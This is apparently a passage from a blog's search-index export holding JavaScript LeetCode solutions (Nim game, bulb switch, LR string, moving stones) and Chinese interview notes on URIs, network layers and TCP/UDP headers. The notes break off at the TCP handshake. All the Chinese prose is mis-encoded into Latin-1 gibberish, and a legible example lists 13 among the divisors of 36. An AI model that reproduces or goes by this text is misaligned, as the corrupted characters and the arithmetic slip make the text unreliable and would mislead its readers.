†é‡Œæœ‰å…«å—çŸ³å¤´ï¼Œä½ å°±ä¸å¯é¿å…åœ°ä¼šè¾“æŽ‰ï¼Œå› ä¸ºä¸ç®¡ä½ ä»Žä¸€å †çŸ³å¤´ä¸­æŒ‘å‡ºä¸€å—ã€ä¸¤å—è¿˜æ˜¯ä¸‰å—ï¼Œä½ çš„å¯¹æ‰‹éƒ½å¯ä»¥é€‰æ‹©ä¸‰å—ã€ä¸¤å—æˆ–ä¸€å—ï¼Œä»¥ç¡®ä¿åœ¨å†ä¸€æ¬¡è½®åˆ°ä½ çš„æ—¶å€™ï¼Œä½ ä¼šé¢å¯¹å››å—çŸ³å¤´ã€‚ 123var canWinNim = function(n) &#123; if(n%4==0)&#123;return false&#125;else&#123;return true&#125;&#125;; æ‰§è¡Œç”¨æ—¶ :76 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†59.01%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :33.8 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†22.35%çš„ç”¨æˆ· 12return n % 4 == 0 ? false : trueæ›´å¿« 319. ç¯æ³¡å¼€å…³åˆå§‹æ—¶æœ‰ n ä¸ªç¯æ³¡å…³é—­ã€‚ ç¬¬ 1 è½®ï¼Œä½ æ‰“å¼€æ‰€æœ‰çš„ç¯æ³¡ã€‚ ç¬¬ 2 è½®ï¼Œæ¯ä¸¤ä¸ªç¯æ³¡ä½ å…³é—­ä¸€æ¬¡ã€‚ ç¬¬ 3 è½®ï¼Œæ¯ä¸‰ä¸ªç¯æ³¡åˆ‡æ¢ä¸€æ¬¡å¼€å…³ï¼ˆå¦‚æžœå…³é—­åˆ™å¼€å¯ï¼Œå¦‚æžœå¼€å¯åˆ™å…³é—­ï¼‰ã€‚ç¬¬ i è½®ï¼Œæ¯ i ä¸ªç¯æ³¡åˆ‡æ¢ä¸€æ¬¡å¼€å…³ã€‚ å¯¹äºŽç¬¬ n è½®ï¼Œä½ åªåˆ‡æ¢æœ€åŽä¸€ä¸ªç¯æ³¡çš„å¼€å…³ã€‚ æ‰¾å‡º n è½®åŽæœ‰å¤šå°‘ä¸ªäº®ç€çš„ç¯æ³¡ã€‚ äºŽæ˜¯è½¬è€Œè§‚å¯ŸæŸä¸ªä½ç½®ï¼Œçœ‹çœ‹æŸä¸ªä½ç½®æ˜¯æ€Žæ ·å˜åŒ–çš„ï¼Œä»€ä¹ˆæ¡ä»¶ä¸‹ä¼šç¿»è½¬ ç¬¬18ä¸ªç¯æ³¡ä¼šåœ¨1,2,3,6,9,18è½®ç¿»è½¬ã€‚ç¬¬36ä¸ªç¯æ³¡ä¼šåœ¨1,2,3,4,6,9,13,18,36è½®ç¿»è½¬ã€‚ è§„å¾‹æ˜¾è€Œæ˜“è§ï¼Œåªæœ‰åœ¨è½®æ•°æ˜¯è¯¥ä½ç½®å› æ•°çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œç¿»è½¬æ“ä½œã€‚ äºŽæ˜¯æˆ‘ä»¬å›žç­”äº†é‚£ä¸ªé—®é¢˜ï¼šåªè¦æ‰¾åˆ°è¯¥ä½ç½®çš„æ‰€æœ‰å› æ•°ä¸ªæ•°ï¼Œæˆ‘ä»¬å°±çŸ¥é“è¯¥ä½ç½®ç¿»è½¬äº†å¤šå°‘æ¬¡ã€‚ æ›´è¿›ä¸€æ­¥çš„ï¼Œé™¤äº†å®Œå…¨å¹³æ–¹æ•°ï¼Œå› æ•°éƒ½æ˜¯æˆå¯¹å‡ºçŽ°çš„ï¼Œè¿™æ„å‘³ç€å®žé™…èµ·åˆ°ç¿»è½¬ä½œç”¨(0-&gt;1)çš„ï¼Œåªæœ‰å®Œå…¨å¹³æ–¹æ•°è€Œå·²ã€‚ æ­¤æ—¶ä»»åŠ¡å·²ç»å¤§å¤§ç®€åŒ–ï¼Œå› ä¸ºnä¸ªç¯æ³¡ç¿»è½¬nè½®ï¼Œæˆ‘ä»¬åªè¦çœ‹çœ‹åˆ°nä½ç½®ï¼Œä¸€å…±æœ‰å¤šå°‘ä¸ªå®Œå…¨å¹³æ–¹æ•°å³å¯ã€‚ parseInt()æ¯”Math.floor()å¿« 123var bulbSwitch = function(n) &#123; return Math.floor(Math.sqrt(n))&#125;; æ‰§è¡Œç”¨æ—¶ :72 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†79.17%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :33.8 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†12.50%çš„ç”¨æˆ· 777. åœ¨LRå­—ç¬¦ä¸²ä¸­äº¤æ¢ç›¸é‚»å­—ç¬¦åœ¨ä¸€ä¸ªç”± â€˜Lâ€™ , â€˜Râ€™ å’Œ â€˜Xâ€™ ä¸‰ä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚â€RXXLRXRXLâ€ï¼‰ä¸­è¿›è¡Œç§»åŠ¨æ“ä½œã€‚ä¸€æ¬¡ç§»åŠ¨æ“ä½œæŒ‡ç”¨ä¸€ä¸ªâ€LXâ€æ›¿æ¢ä¸€ä¸ªâ€XLâ€ï¼Œæˆ–è€…ç”¨ä¸€ä¸ªâ€XRâ€æ›¿æ¢ä¸€ä¸ªâ€RXâ€ã€‚çŽ°ç»™å®šèµ·å§‹å­—ç¬¦ä¸²startå’Œç»“æŸå­—ç¬¦ä¸²endï¼Œè¯·ç¼–å†™ä»£ç ï¼Œå½“ä¸”ä»…å½“å­˜åœ¨ä¸€ç³»åˆ—ç§»åŠ¨æ“ä½œä½¿å¾—startå¯ä»¥è½¬æ¢æˆendæ—¶ï¼Œ è¿”å›žTrueã€‚ 123456789101112131415161718192021222324252627var canTransform = function(start, end) &#123; let i=0,j=0; while(i&lt;start.length&amp;&amp;j&lt;start.length)&#123; while(start.charAt(i)==&quot;X&quot;)&#123; i++ &#125; while(end.charAt(j)==&quot;X&quot;)&#123; j++ &#125; if(start[i]!=end[j])&#123; return false &#125;//LRä¸èƒ½äº’ç›¸ç©¿è¿‡ if(start[i]==&quot;R&quot;)&#123; if(i&gt;j)&#123; return false &#125; &#125;//Råªèƒ½å³ç§» if(start[i]==&quot;L&quot;)&#123; if(i&lt;j)&#123; return false &#125; &#125;//Låªèƒ½å·¦ç§» i++ j++ &#125; return true&#125;; æ‰§è¡Œç”¨æ—¶ :92 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†72.73%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :35.7 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†100.00%çš„ç”¨æˆ· 1033. ç§»åŠ¨çŸ³å­ç›´åˆ°è¿žç»­ä¸‰æžšçŸ³å­æ”¾ç½®åœ¨æ•°è½´ä¸Šï¼Œä½ç½®åˆ†åˆ«ä¸º aï¼Œbï¼Œcã€‚ æ¯ä¸€å›žåˆï¼Œæˆ‘ä»¬å‡è®¾è¿™ä¸‰æžšçŸ³å­å½“å‰åˆ†åˆ«ä½äºŽä½ç½® x, y, z ä¸” x &lt; y &lt; zã€‚ä»Žä½ç½® x æˆ–è€…æ˜¯ä½ç½® z æ‹¿èµ·ä¸€æžšçŸ³å­ï¼Œå¹¶å°†è¯¥çŸ³å­ç§»åŠ¨åˆ°æŸä¸€æ•´æ•°ä½ç½® k å¤„ï¼Œå…¶ä¸­ x &lt; k &lt; z ä¸” k != yã€‚ å½“ä½ æ— æ³•è¿›è¡Œä»»ä½•ç§»åŠ¨æ—¶ï¼Œå³ï¼Œè¿™äº›çŸ³å­çš„ä½ç½®è¿žç»­æ—¶ï¼Œæ¸¸æˆç»“æŸã€‚ è¦ä½¿æ¸¸æˆç»“æŸï¼Œä½ å¯ä»¥æ‰§è¡Œçš„æœ€å°å’Œæœ€å¤§ç§»åŠ¨æ¬¡æ•°åˆ†åˆ«æ˜¯å¤šå°‘ï¼Ÿ ä»¥é•¿åº¦ä¸º 2 çš„æ•°ç»„å½¢å¼è¿”å›žç­”æ¡ˆï¼šanswer = [minimum_moves, maximum_moves] 1234567891011121314151617var numMovesStones = function(a, b, c) &#123; [a,b,c]=[a,b,c].sort((a,b)=&gt;a-b) let arr=[0,0]; if(b-a==1&amp;&amp;c-b==1)&#123; return arr &#125;else if(b-a==1)&#123; arr[0]=1 &#125;else if(c-b==1)&#123; arr[0]=1 &#125;else if(b-a==2||c-b==2)&#123; arr[0]=1 &#125;else&#123; arr[0]=2 &#125; arr[1]=c-a-2 return arr&#125;; æ‰§è¡Œç”¨æ—¶ :76 ms, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†90.20%çš„ç”¨æˆ· å†…å­˜æ¶ˆè€— :33.9 MB, åœ¨æ‰€æœ‰ JavaScript æäº¤ä¸­å‡»è´¥äº†100.00%çš„ç”¨æˆ·]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_web%2F</url>
    <content type="text"><![CDATA[å‰è¨€ è®¡ç®—æœºç½‘ç»œ å¤§ç™½è¯ï¼Œå°±æ˜¯URIæ˜¯æŠ½è±¡çš„å®šä¹‰ï¼Œä¸ç®¡ç”¨ä»€ä¹ˆæ–¹æ³•è¡¨ç¤ºï¼Œåªè¦èƒ½å®šä½ä¸€ä¸ªèµ„æºï¼Œå°±å«URIï¼Œæœ¬æ¥è®¾æƒ³çš„çš„ä½¿ç”¨ä¸¤ç§æ–¹æ³•å®šä½ï¼š1ï¼ŒURLï¼Œç”¨åœ°å€å®šä½ï¼›2ï¼ŒURN ç”¨åç§°å®šä½ã€‚ é€šè¿‡URLæ‰¾åˆ°èµ„æºæ˜¯å¯¹ç½‘ç»œä½ç½®è¿›è¡Œæ ‡è¯†ï¼Œå¦‚ï¼šé€šè¿‡URIæ‰¾åˆ°èµ„æºæ˜¯é€šè¿‡å¯¹åç§°è¿›è¡Œæ ‡è¯†ï¼Œè¿™ä¸ªåç§°åœ¨æŸå‘½åç©ºé—´ä¸­ï¼Œå¹¶ä¸ä»£è¡¨ç½‘ç»œåœ°å€ï¼Œå¦‚ï¼šurn:issn:1535-3613 URI æ˜¯ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼Œè€Œ URL æ˜¯ç»Ÿä¸€èµ„æºå®šä½ç¬¦ã€‚å› æ­¤ï¼Œç¬¼ç»Ÿåœ°è¯´ï¼Œæ¯ä¸ª URL éƒ½æ˜¯ URIï¼Œä½†ä¸ä¸€å®šæ¯ä¸ª URI éƒ½æ˜¯ URLã€‚è¿™æ˜¯å› ä¸º URI è¿˜åŒ…æ‹¬ä¸€ä¸ªå­ç±»ï¼Œå³ç»Ÿä¸€èµ„æºåç§° (URN)ï¼Œå®ƒå‘½åèµ„æºä½†ä¸æŒ‡å®šå¦‚ä½•å®šä½èµ„æºã€‚ä¸Šé¢çš„ mailtoã€news å’Œ isbn URI éƒ½æ˜¯ URN çš„ç¤ºä¾‹ã€‚ URI å’Œ URL æ¦‚å¿µä¸Šçš„ä¸åŒåæ˜ åœ¨æ­¤ç±»å’Œ URL ç±»çš„ä¸åŒä¸­ã€‚ æ­¤ç±»çš„å®žä¾‹ä»£è¡¨ç”± RFC 2396 å®šä¹‰çš„è¯­æ³•æ„ä¹‰ä¸Šçš„ä¸€ä¸ª URI å¼•ç”¨ã€‚URI å¯ä»¥æ˜¯ç»å¯¹çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹çš„ã€‚å¯¹ URI å­—ç¬¦ä¸²æŒ‰ç…§ä¸€èˆ¬è¯­æ³•è¿›è¡Œè§£æžï¼Œä¸è€ƒè™‘å®ƒæ‰€æŒ‡å®šçš„æ–¹æ¡ˆï¼ˆå¦‚æžœæœ‰ï¼‰ä¸å¯¹ä¸»æœºï¼ˆå¦‚æžœæœ‰ï¼‰æ‰§è¡ŒæŸ¥æ‰¾ï¼Œä¹Ÿä¸æž„é€ ä¾èµ–äºŽæ–¹æ¡ˆçš„æµå¤„ç†ç¨‹åºã€‚ç›¸ç­‰æ€§ã€å“ˆå¸Œè®¡ç®—ä»¥åŠæ¯”è¾ƒéƒ½ä¸¥æ ¼åœ°æ ¹æ®å®žä¾‹çš„å­—ç¬¦å†…å®¹è¿›è¡Œå®šä¹‰ã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ª URI å®žä¾‹å’Œä¸€ä¸ªæ”¯æŒè¯­æ³•æ„ä¹‰ä¸Šçš„ã€ä¾èµ–äºŽæ–¹æ¡ˆçš„æ¯”è¾ƒã€è§„èŒƒåŒ–ã€è§£æžå’Œç›¸å¯¹åŒ–è®¡ç®—çš„ç»“æž„åŒ–å­—ç¬¦ä¸²å·®ä¸å¤šã€‚ ä½œä¸ºå¯¹ç…§ï¼ŒURL ç±»çš„å®žä¾‹ä»£è¡¨äº† URL çš„è¯­æ³•ç»„æˆéƒ¨åˆ†ä»¥åŠè®¿é—®å®ƒæè¿°çš„èµ„æºæ‰€éœ€çš„ä¿¡æ¯ã€‚URL å¿…é¡»æ˜¯ç»å¯¹çš„ï¼Œå³å®ƒå¿…é¡»å§‹ç»ˆæŒ‡å®šä¸€ä¸ªæ–¹æ¡ˆã€‚URL å­—ç¬¦ä¸²æŒ‰ç…§å…¶æ–¹æ¡ˆè¿›è¡Œè§£æžã€‚é€šå¸¸ä¼šä¸º URL å»ºç«‹ä¸€ä¸ªæµå¤„ç†ç¨‹åºï¼Œå®žé™…ä¸Šæ— æ³•ä¸ºæœªæä¾›å¤„ç†ç¨‹åºçš„æ–¹æ¡ˆåˆ›å»ºä¸€ä¸ª URL å®žä¾‹ã€‚ç›¸ç­‰æ€§å’Œå“ˆå¸Œè®¡ç®—ä¾èµ–äºŽæ–¹æ¡ˆå’Œä¸»æœºçš„ Internet åœ°å€ï¼ˆå¦‚æžœæœ‰ï¼‰ï¼›æ²¡æœ‰å®šä¹‰æ¯”è¾ƒã€‚æ¢å¥è¯è¯´ï¼ŒURL æ˜¯ä¸€ä¸ªç»“æž„åŒ–å­—ç¬¦ä¸²ï¼Œå®ƒæ”¯æŒè§£æžçš„è¯­æ³•è¿ç®—ä»¥åŠæŸ¥æ‰¾ä¸»æœºå’Œæ‰“å¼€åˆ°æŒ‡å®šèµ„æºçš„è¿žæŽ¥ä¹‹ç±»çš„ç½‘ç»œ I/O æ“ä½œã€‚ URIç±»ä¸åŒ…å«ä»»ä½•è®¿é—®èµ„æºçš„æ–¹æ³•ï¼Œå®ƒå”¯ä¸€çš„ä½œç”¨å°±æ˜¯è§£æžã€‚ ç›¸åçš„æ˜¯ï¼ŒURLç±»å¯ä»¥æ‰“å¼€ä¸€ä¸ªåˆ°è¾¾èµ„æºçš„æµã€‚ URIâ€”Uniform Resource Identifieré€šç”¨èµ„æºæ ‡å¿—ç¬¦Webä¸Šå¯ç”¨çš„æ¯ç§èµ„æºå¦‚HTMLæ–‡æ¡£ã€å›¾åƒã€è§†é¢‘ç‰‡æ®µã€ç¨‹åºç­‰éƒ½æ˜¯ä¸€ä¸ªæ¥URIæ¥å®šä½çš„URIä¸€èˆ¬ç”±ä¸‰éƒ¨ç»„æˆâ‘ è®¿é—®èµ„æºçš„å‘½åæœºåˆ¶â‘¡å­˜æ”¾èµ„æºçš„ä¸»æœºåâ‘¢èµ„æºè‡ªèº«çš„åç§°ï¼Œç”±è·¯å¾„è¡¨ç¤ºï¼Œç€é‡å¼ºè°ƒäºŽèµ„æºã€‚ URLâ€”Uniform Resource Locationç»Ÿä¸€èµ„æºå®šä½ç¬¦URLæ˜¯Internetä¸Šç”¨æ¥æè¿°ä¿¡æ¯èµ„æºçš„å­—ç¬¦ä¸²ï¼Œä¸»è¦ç”¨åœ¨å„ç§WWWå®¢æˆ·ç¨‹åºå’ŒæœåŠ¡å™¨ç¨‹åºä¸Šï¼Œç‰¹åˆ«æ˜¯è‘—åçš„Mosaicã€‚é‡‡ç”¨URLå¯ä»¥ç”¨ä¸€ç§ç»Ÿä¸€çš„æ ¼å¼æ¥æè¿°å„ç§ä¿¡æ¯èµ„æºï¼ŒåŒ…æ‹¬æ–‡ä»¶ã€æœåŠ¡å™¨çš„åœ°å€å’Œç›®å½•ç­‰ã€‚URLä¸€èˆ¬ç”±ä¸‰éƒ¨ç»„æˆâ‘ åè®®(æˆ–ç§°ä¸ºæœåŠ¡æ–¹å¼)â‘¡å­˜æœ‰è¯¥èµ„æºçš„ä¸»æœºIPåœ°å€(æœ‰æ—¶ä¹ŸåŒ…æ‹¬ç«¯å£å·)â‘¢ä¸»æœºèµ„æºçš„å…·ä½“åœ°å€ã€‚å¦‚ç›®å½•å’Œæ–‡ä»¶åç­‰ äº”å±‚åè®® åº”ç”¨å±‚ ï¼šä¸ºç‰¹å®šåº”ç”¨ç¨‹åºæä¾›æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œä¾‹å¦‚ HTTPã€DNS ç­‰åè®®ã€‚æ•°æ®å•ä½ä¸ºæŠ¥æ–‡ã€‚ ä¼ è¾“å±‚ ï¼šä¸ºè¿›ç¨‹æä¾›é€šç”¨æ•°æ®ä¼ è¾“æœåŠ¡ã€‚ç”±äºŽåº”ç”¨å±‚åè®®å¾ˆå¤šï¼Œå®šä¹‰é€šç”¨çš„ä¼ è¾“å±‚åè®®å°±å¯ä»¥æ”¯æŒä¸æ–­å¢žå¤šçš„åº”ç”¨å±‚åè®®ã€‚è¿è¾“å±‚åŒ…æ‹¬ä¸¤ç§åè®®ï¼šä¼ è¾“æŽ§åˆ¶åè®® TCPï¼Œæä¾›é¢å‘è¿žæŽ¥ã€å¯é çš„æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œæ•°æ®å•ä½ä¸ºæŠ¥æ–‡æ®µï¼›ç”¨æˆ·æ•°æ®æŠ¥åè®® UDPï¼Œæä¾›æ— è¿žæŽ¥ã€å°½æœ€å¤§åŠªåŠ›çš„æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œæ•°æ®å•ä½ä¸ºç”¨æˆ·æ•°æ®æŠ¥ã€‚TCP ä¸»è¦æä¾›å®Œæ•´æ€§æœåŠ¡ï¼ŒUDP ä¸»è¦æä¾›åŠæ—¶æ€§æœåŠ¡ã€‚ ç½‘ç»œå±‚ ï¼šä¸ºä¸»æœºæä¾›æ•°æ®ä¼ è¾“æœåŠ¡ã€‚è€Œä¼ è¾“å±‚åè®®æ˜¯ä¸ºä¸»æœºä¸­çš„è¿›ç¨‹æä¾›æ•°æ®ä¼ è¾“æœåŠ¡ã€‚ç½‘ç»œå±‚æŠŠä¼ è¾“å±‚ä¼ é€’ä¸‹æ¥çš„æŠ¥æ–‡æ®µæˆ–è€…ç”¨æˆ·æ•°æ®æŠ¥å°è£…æˆåˆ†ç»„ã€‚ æ•°æ®é“¾è·¯å±‚ ï¼šç½‘ç»œå±‚é’ˆå¯¹çš„è¿˜æ˜¯ä¸»æœºä¹‹é—´çš„æ•°æ®ä¼ è¾“æœåŠ¡ï¼Œè€Œä¸»æœºä¹‹é—´å¯ä»¥æœ‰å¾ˆå¤šé“¾è·¯ï¼Œé“¾è·¯å±‚åè®®å°±æ˜¯ä¸ºåŒä¸€é“¾è·¯çš„ä¸»æœºæä¾›æ•°æ®ä¼ è¾“æœåŠ¡ã€‚æ•°æ®é“¾è·¯å±‚æŠŠç½‘ç»œå±‚ä¼ ä¸‹æ¥çš„åˆ†ç»„å°è£…æˆå¸§ã€‚ ç‰©ç†å±‚ ï¼šè€ƒè™‘çš„æ˜¯æ€Žæ ·åœ¨ä¼ è¾“åª’ä½“ä¸Šä¼ è¾“æ•°æ®æ¯”ç‰¹æµï¼Œè€Œä¸æ˜¯æŒ‡å…·ä½“çš„ä¼ è¾“åª’ä½“ã€‚ç‰©ç†å±‚çš„ä½œç”¨æ˜¯å°½å¯èƒ½å±è”½ä¼ è¾“åª’ä½“å’Œé€šä¿¡æ‰‹æ®µçš„å·®å¼‚ï¼Œä½¿æ•°æ®é“¾è·¯å±‚æ„Ÿè§‰ä¸åˆ°è¿™äº›å·®å¼‚ã€‚ OSIå…¶ä¸­è¡¨ç¤ºå±‚å’Œä¼šè¯å±‚ç”¨é€”å¦‚ä¸‹ï¼š è¡¨ç¤ºå±‚ ï¼šæ•°æ®åŽ‹ç¼©ã€åŠ å¯†ä»¥åŠæ•°æ®æè¿°ï¼Œè¿™ä½¿å¾—åº”ç”¨ç¨‹åºä¸å¿…å…³å¿ƒåœ¨å„å°ä¸»æœºä¸­æ•°æ®å†…éƒ¨æ ¼å¼ä¸åŒçš„é—®é¢˜ã€‚ ä¼šè¯å±‚ ï¼šå»ºç«‹åŠç®¡ç†ä¼šè¯ã€‚ äº”å±‚åè®®æ²¡æœ‰è¡¨ç¤ºå±‚å’Œä¼šè¯å±‚ï¼Œè€Œæ˜¯å°†è¿™äº›åŠŸèƒ½ç•™ç»™åº”ç”¨ç¨‹åºå¼€å‘è€…å¤„ç†ã€‚ TCP/IPå®ƒåªæœ‰å››å±‚ï¼Œç›¸å½“äºŽäº”å±‚åè®®ä¸­æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚åˆå¹¶ä¸ºç½‘ç»œæŽ¥å£å±‚ã€‚ TCP/IP ä½“ç³»ç»“æž„ä¸ä¸¥æ ¼éµå¾ª OSI åˆ†å±‚æ¦‚å¿µï¼Œåº”ç”¨å±‚å¯èƒ½ä¼šç›´æŽ¥ä½¿ç”¨ IP å±‚æˆ–è€…ç½‘ç»œæŽ¥å£å±‚ã€‚ åŸºäºŽTCPçš„åº”ç”¨å±‚åè®®æœ‰ï¼šSMTPã€TELNETã€HTTPã€FTP åŸºäºŽUDPçš„åº”ç”¨å±‚åè®®ï¼šDNSã€TFTPï¼ˆç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰ã€RIPï¼ˆè·¯ç”±é€‰æ‹©åè®®ï¼‰ã€DHCPã€BOOTPï¼ˆæ˜¯DHCPçš„å‰èº«ï¼‰ã€IGMPï¼ˆInternetç»„ç®¡ç†åè®®ï¼‰ DNSå ç”¨53å·ç«¯å£ï¼ŒåŒæ—¶ä½¿ç”¨TCPå’ŒUDPåè®®ã€‚DNSåŒºåŸŸä¼ è¾“çš„æ—¶å€™ä½¿ç”¨TCPåè®®åŸŸåè§£æžæ—¶ä½¿ç”¨UDPåè®® å„ä¸ªåè®®çš„ä½œç”¨å’Œå…³ç³»ä»¥å¤ªç½‘(Ethernet)åè®®:è§£å†³å±€åŸŸç½‘å†…ç‚¹å¯¹ç‚¹é€šä¿¡IPåè®®: è§£å†³å¤šä¸ªå±€åŸŸç½‘ä¹‹é—´çš„é€šä¿¡TCPåè®®: TCP æ˜¯ä»¥å¤ªç½‘åè®®å’ŒIPåè®®çš„ä¸Šå±‚åè®®ï¼Œä¹Ÿæ˜¯åº”ç”¨å±‚åè®®çš„ä¸‹å±‚åè®®TCP åè®®: ä¿è¯æ•°æ®é€šä¿¡çš„å®Œæ•´æ€§å’Œå¯é æ€§ï¼Œé˜²æ­¢ä¸¢åŒ…ã€‚IPåè®®åªæ˜¯ä¸€ä¸ªåœ°å€åè®®,å¹¶ä¸ä¿è¯æ•°æ®åŒ…çš„å®Œæ•´ã€‚å¦‚æžœè·¯ç”±å™¨ä¸¢åŒ…(æ¯”å¦‚ç¼“å­˜æ»¡äº†,æ–°è¿›æ¥çš„æ•°æ®åŒ…å°±ä¼šä¸¢å¤±),å°±éœ€è¦å‘çŽ°ä¸¢äº†å“ªä¸€ä¸ªåŒ…,ä»¥åŠå¦‚ä½•é‡æ–°å‘é€è¿™ä¸ªåŒ….è¿™å°±è¦ä¾é TCPåè®®ã€‚ ä¼ è¾“å±‚UDP å’Œ TCP çš„ç‰¹ç‚¹ ç”¨æˆ·æ•°æ®æŠ¥åè®® UDPï¼ˆUser Datagram Protocolï¼‰æ˜¯æ— è¿žæŽ¥çš„ï¼Œå°½æœ€å¤§å¯èƒ½äº¤ä»˜ï¼Œæ²¡æœ‰æ‹¥å¡žæŽ§åˆ¶ï¼Œé¢å‘æŠ¥æ–‡ï¼ˆå¯¹äºŽåº”ç”¨ç¨‹åºä¼ ä¸‹æ¥çš„æŠ¥æ–‡ä¸åˆå¹¶ä¹Ÿä¸æ‹†åˆ†ï¼Œåªæ˜¯æ·»åŠ  UDP é¦–éƒ¨ï¼‰ï¼Œæ”¯æŒä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡ã€‚ ä¼ è¾“æŽ§åˆ¶åè®® TCPï¼ˆTransmission Control Protocolï¼‰æ˜¯é¢å‘è¿žæŽ¥çš„ï¼Œæä¾›å¯é äº¤ä»˜ï¼Œæœ‰æµé‡æŽ§åˆ¶ï¼Œæ‹¥å¡žæŽ§åˆ¶ï¼Œæä¾›å…¨åŒå·¥é€šä¿¡ï¼Œé¢å‘å­—èŠ‚æµï¼ˆæŠŠåº”ç”¨å±‚ä¼ ä¸‹æ¥çš„æŠ¥æ–‡çœ‹æˆå­—èŠ‚æµï¼ŒæŠŠå­—èŠ‚æµç»„ç»‡æˆå¤§å°ä¸ç­‰çš„æ•°æ®å—ï¼‰ï¼Œæ¯ä¸€æ¡ TCP è¿žæŽ¥åªèƒ½æ˜¯ç‚¹å¯¹ç‚¹çš„ï¼ˆä¸€å¯¹ä¸€ï¼‰ã€‚ UDP é¦–éƒ¨æ ¼å¼é¦–éƒ¨å­—æ®µåªæœ‰ 8 ä¸ªå­—èŠ‚ï¼ŒåŒ…æ‹¬æºç«¯å£ã€ç›®çš„ç«¯å£ã€é•¿åº¦ã€æ£€éªŒå’Œã€‚12 å­—èŠ‚çš„ä¼ªé¦–éƒ¨æ˜¯ä¸ºäº†è®¡ç®—æ£€éªŒå’Œä¸´æ—¶æ·»åŠ çš„ã€‚ TCP é¦–éƒ¨æ ¼å¼ åºå· ï¼šç”¨äºŽå¯¹å­—èŠ‚æµè¿›è¡Œç¼–å·ï¼Œä¾‹å¦‚åºå·ä¸º 301ï¼Œè¡¨ç¤ºç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å·ä¸º 301ï¼Œå¦‚æžœæºå¸¦çš„æ•°æ®é•¿åº¦ä¸º 100 å­—èŠ‚ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·åº”ä¸º 401ã€‚ ç¡®è®¤å· ï¼šæœŸæœ›æ”¶åˆ°çš„ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·ã€‚ä¾‹å¦‚ B æ­£ç¡®æ”¶åˆ° A å‘é€æ¥çš„ä¸€ä¸ªæŠ¥æ–‡æ®µï¼Œåºå·ä¸º 501ï¼Œæºå¸¦çš„æ•°æ®é•¿åº¦ä¸º 200 å­—èŠ‚ï¼Œå› æ­¤ B æœŸæœ›ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·ä¸º 701ï¼ŒB å‘é€ç»™ A çš„ç¡®è®¤æŠ¥æ–‡æ®µä¸­ç¡®è®¤å·å°±ä¸º 701ã€‚ æ•°æ®åç§» ï¼šæŒ‡çš„æ˜¯æ•°æ®éƒ¨åˆ†è·ç¦»æŠ¥æ–‡æ®µèµ·å§‹å¤„çš„åç§»é‡ï¼Œå®žé™…ä¸ŠæŒ‡çš„æ˜¯é¦–éƒ¨çš„é•¿åº¦ã€‚ ç¡®è®¤ ACK ï¼šå½“ ACK=1 æ—¶ç¡®è®¤å·å­—æ®µæœ‰æ•ˆï¼Œå¦åˆ™æ— æ•ˆã€‚TCP è§„å®šï¼Œåœ¨è¿žæŽ¥å»ºç«‹åŽæ‰€æœ‰ä¼ é€çš„æŠ¥æ–‡æ®µéƒ½å¿…é¡»æŠŠ ACK ç½® 1ã€‚ åŒæ­¥ SYN ï¼šåœ¨è¿žæŽ¥å»ºç«‹æ—¶ç”¨æ¥åŒæ­¥åºå·ã€‚å½“ SYN=1ï¼ŒACK=0 æ—¶è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªè¿žæŽ¥è¯·æ±‚æŠ¥æ–‡æ®µã€‚è‹¥å¯¹æ–¹åŒæ„å»ºç«‹è¿žæŽ¥ï¼Œåˆ™å“åº”æŠ¥æ–‡ä¸­ SYN=1ï¼ŒACK=1ã€‚ ç»ˆæ­¢ FIN ï¼šç”¨æ¥é‡Šæ”¾ä¸€ä¸ªè¿žæŽ¥ï¼Œå½“ FIN=1 æ—¶ï¼Œè¡¨ç¤ºæ­¤æŠ¥æ–‡æ®µçš„å‘é€æ–¹çš„æ•°æ®å·²å‘é€å®Œæ¯•ï¼Œå¹¶è¦æ±‚é‡Šæ”¾è¿žæŽ¥ã€‚ çª—å£ ï¼šçª—å£å€¼ä½œä¸ºæŽ¥æ”¶æ–¹è®©å‘é€æ–¹è®¾ç½®å…¶å‘é€çª—å£çš„ä¾æ®ã€‚ä¹‹æ‰€ä»¥è¦æœ‰è¿™ä¸ªé™åˆ¶ï¼Œæ˜¯å› ä¸ºæŽ¥æ”¶æ–¹çš„æ•°æ®ç¼“å­˜ç©ºé—´æ˜¯æœ‰é™çš„ã€‚ TCP çš„ä¸‰æ¬¡æ¡æ‰‹ å‡è®¾ A ä¸ºå®¢æˆ·ç«¯ï¼ŒB ä¸ºæœåŠ¡å™¨ç«¯ã€‚ é¦–å…ˆ B å¤„äºŽ LISTENï¼ˆç›‘å¬ï¼‰çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·çš„è¿žæŽ¥è¯·æ±‚ã€‚ A å‘ B 